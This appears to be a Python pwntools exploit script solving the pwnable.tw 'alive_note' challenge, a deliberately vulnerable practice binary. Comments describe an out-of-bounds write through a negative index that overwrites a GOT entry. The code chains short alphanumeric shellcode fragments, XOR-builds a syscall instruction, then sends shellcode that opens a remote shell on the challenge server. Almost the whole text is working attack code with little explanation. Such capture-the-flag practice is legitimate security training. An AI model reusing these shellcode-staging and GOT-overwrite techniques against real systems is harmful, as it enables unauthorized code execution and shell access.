from curses.ascii import isalnum
from pwn import *
import time
## !!!!!!!!!!!!! local environ only stack nas rwx but remote has rwx at heap
## input a negative number to atoi() will cause oob, and note address is at .bss section
## so we can overwrite got table with heap address using add function to call shellcode

#r = process("./alive_note")
r = remote('chall.pwnable.tw',10300)
context.arch='i386'

### register when shellcode execute
# $eax   : 0x8ec21e0  →  0x00000000
# $ebx   : 0x0
# $ecx   : 0xa
# $edx   : 0x0
# $esp   : 0xfff47c1c  →  0x80488ef  →  <del_note+81> add esp, 0x10
# $ebp   : 0xfff47c48  →  0xfff47c58  →  0x00000000
# $esi   : 0xf7fb7000  →  0x001ead6c
# $edi   : 0xf7fb7000  →  0x001ead6c
# $eip   : 0x8ec21a0  →  "PRXuK"


def delete(idx):
    r.sendafter(b'Your choice :',b'3')
    r.sendafter(b'Index :',str(idx))

def add(idx,name):
    r.sendafter(b'Your choice :',b'1')
    r.sendafter(b'Index :',str(idx))
    r.sendafter(b'Name :',name)

def inject(idx,code):
    payload = asm(code) 
    code_len = len(payload)
    if len(payload) > 6 :
        print(f'len error')
        print(f'ERROR CODE : {code}')
        raise 
    if not payload.decode().isalnum() :
        print(f'not alnum')
        print(f'ERROR CODE : {code}')
        raise

    payload += b'\x75'
    jmp_addr = 0x40 + (0x10 - 2 - code_len) 
    payload += int.to_bytes(jmp_addr,1,'little')
    payload = payload.ljust(0x8,b'\x00')

    add(idx,payload)
    for i in range(4):
        add(1,b'\x00')
    
    time.sleep(0.1)


inject(-27,'push ebx ; push eax ; pop ecx ; pop eax ; dec eax ; dec eax' ) # free 

# ### 0xfffe ^ 0x3042 ^ 0x4f71 = 0x80cd 
inject(1,'push 0x7a ; pop edx ; inc edx ; inc edx ; inc edx')
inject(1,'xor ax, 0x3042 ;  inc edx ;  inc edx')
inject(1,'xor ax, 0x4f71 ;  inc edx ;  inc edx')   
inject(1,'xor word ptr [ecx+0x50], ax ;  inc edx ;  inc edx')
payload = asm('push 0x33 ; pop eax ; xor al, 0x30 ;  push ebx' ) + b'\x75\x48' 
add(2,payload)
# inject(1,'inc edx')   ### 470
#input()
delete(2)
r.sendline(b'\x42'*0x52 +  asm(shellcraft.sh()))
r.interactive()